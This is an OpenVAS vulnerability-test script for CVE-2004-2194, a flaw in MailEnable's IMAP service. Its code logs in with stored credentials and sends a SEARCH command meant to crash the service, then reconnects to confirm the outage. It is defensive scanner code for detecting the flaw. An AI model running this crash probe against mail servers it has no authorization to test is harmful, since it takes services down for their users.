# OpenVAS Vulnerability Test
# $Id: mailenable_imap_search_dos.nasl 13622 2019-02-13 09:13:18Z mmartin $
# Description: MailEnable IMAP Service Search DoS Vulnerability
#
# Authors:
# George A. Theall, <theall@tifaware.com>
#
# Copyright:
# Copyright (C) 2004 George A. Theall
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.15487");
  script_version("$Revision: 13622 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-13 10:13:18 +0100 (Wed, 13 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

  script_cve_id("CVE-2004-2194");
  script_bugtraq_id(11418);
  script_name("MailEnable IMAP Service Search DoS Vulnerability");

  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2004 George A. Theall");
  script_family("Denial of Service");

  script_dependencies("imap4_banner.nasl", "logins.nasl");
  script_require_ports("Services/imap", 143);
  script_mandatory_keys("imap/banner/available", "imap/login", "imap/password");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"solution", value:"Upgrade to MailEnable Professional 1.5e or later.");

  script_tag(name:"summary", value:"The target is running at least one instance of MailEnable's IMAP
  service. A flaw exists in MailEnable Professional Edition versions 1.5a-d that results in this
  service crashing if it receives a SEARCH command.");

  script_tag(name:"impact", value:"An authenticated user could send this command either on purpose as
  a denial of service attack or unwittingly since some IMAP clients, such as IMP and Vmail, use it as
  part of the normal login process.");

  exit(0);
}

include("misc_func.inc");
include("imap_func.inc");

kb_creds = imap_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];
if(!user || !pass)
  exit(0);

port = get_imap_port(default:143);

# NB: MailEnable doesn't truly identify itself in the banner so we just
#     blindly login and do a search to try to bring down the service
#     if it looks like it's MailEnable.
banner = get_imap_banner(port:port);
if(!banner || "IMAP4rev1 server ready at" >!< banner)
  exit(0);

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

s = recv_line(socket:soc, length:1024);
s = chomp(s);
if(!s || "IMAP4rev1 server ready at" >!< s) {
  close(soc);
  exit(0);
}

tag = 0;

++tag;
# nb: MailEnable supports the obsolete LOGIN SASL mechanism, which I'll use.
c = string("a", string(tag), " AUTHENTICATE LOGIN");

send(socket:soc, data:string(c, "\r\n"));
s = recv_line(socket:soc, length:1024);
s = chomp(s);

if (s =~ "^\+ ") {
  s = s - "+ ";
  s = base64_decode(str:s);
  if ("User Name" >< s) {
    c = base64(str:user);

    send(socket:soc, data:string(c, "\r\n"));
    s = recv_line(socket:soc, length:1024);
    s = chomp(s);

    if (s =~ "^\+ ") {
      s = s - "+ ";
      s = base64_decode(str:s);
    }
    if ("Password" >< s) {
      c = base64(str:pass);
      send(socket:soc, data:string(c, "\r\n"));
    }
  }
}
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
  resp = '';
}

# If successful, select the INBOX.
if (resp && resp =~ "OK") {
  ++tag;
  c = string("a", string(tag), " SELECT INBOX");
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
    resp = '';
  }

  # If successful, search it.
  if (resp && resp =~ "OK") {
    ++tag;
    c = string("a", string(tag), " SEARCH UNDELETED");
    send(socket:soc, data:string(c, "\r\n"));
    while (s = recv_line(socket:soc, length:1024)) {
      s = chomp(s);
      m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
      if (!isnull(m)) {
        resp = m[1];
        break;
      }
      resp = '';
    }

    # If we don't get a response, make sure the service is truly down.
    if (!resp) {
      close(soc);
      soc = open_sock_tcp(port);
      if (!soc) {
        security_message(port:port);
        exit(0);
      }
    }
  }
}

# Logout.
++tag;
c = string("a", string(tag), " LOGOUT");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}
close(soc);
exit(99);
